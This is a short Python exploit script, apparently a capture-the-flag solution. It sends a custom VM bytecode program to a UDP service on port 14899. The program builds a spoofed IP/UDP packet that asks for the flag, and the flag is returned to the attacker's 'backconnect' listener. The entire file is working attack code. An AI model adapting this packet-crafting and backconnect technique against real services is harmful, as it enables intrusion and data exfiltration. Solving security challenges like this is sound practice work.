#!/usr/bin/env python3
import argparse
import scapy.layers.inet
import socket

def make_goal(payload: bytes, backconnect: str, lport: int, pad: bytes = b':3', total_length: int = 0x100) -> bytes:
    suffix = b''
    while True:
        goal = bytes(
            scapy.layers.inet.IP(dst='58.51.58.51', src=backconnect) /
            scapy.layers.inet.UDP(dport=14899, sport=lport) /
            (payload + suffix)
        )
        if len(goal) < total_length:
            suffix += pad * ((total_length - len(goal)) // len(pad))
        elif len(goal) == total_length:
            prefix = goal[:-len(suffix)]
            assert prefix + suffix == goal
            return prefix
        else:
            raise ValueError('payload is too long')


def main(target: str, backconnect: str, lport: int):
    server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server.bind(('0.0.0.0', lport))
    if not lport:
        lport = server.getsockname()[1]

    prefix = make_goal(b'please give me the flag ' + b':3' * 60, backconnect, lport)

    program = b''
    UNUSED = 0xf4
    for i, b in enumerate(prefix):
        if b:
            program += bytes([0x02, i, UNUSED, b])

    assert len(prefix) > ord(b'3') + 1

    program += bytes([0x02, 0xff, UNUSED, len(prefix)])         # mov [0xff], len(prefix)
    program += bytes([0x14, 0xff, prefix.index(b':'), UNUSED])  # st  [[0xff]], [...]
    program += bytes([0x0a, 0xff, UNUSED, UNUSED])              # inc [0xff]
    program += bytes([0x14, 0xff, prefix.index(b'3'), UNUSED])  # st  [[0xff]], [...]
    program += bytes([0x0a, 0xff, UNUSED, UNUSED])              # inc [0xff]
    program += bytes([0x08, 0xff, UNUSED, ord(b'3') + 1])       # cmp [0xff], '4'
    program += bytes([0x0d, UNUSED, UNUSED, 0x4])               # jz  end
    program += bytes([0x0c, UNUSED, UNUSED, 0x19])              # jmp st.
    program += bytes([0x06, 0xff, UNUSED, 1])                   # sub [0xff], 1
    program += bytes([0x12, UNUSED, UNUSED, UNUSED])            # finish
    print(f'Generated {len(program) // 4} instructions')

    packet = b' ' * (8 + 0x100) + program
    assert len(packet) <= 1000 - 28

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(packet, (target, 14899))
    print(server.recv(4096).decode().strip())

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('host', help='Target host')
    parser.add_argument('self', help='Our host, for backconnects')
    parser.add_argument('--lport', help='Local port for backconnects', type=int, default=0)
    args = parser.parse_args()
    main(args.host, args.self, args.lport)
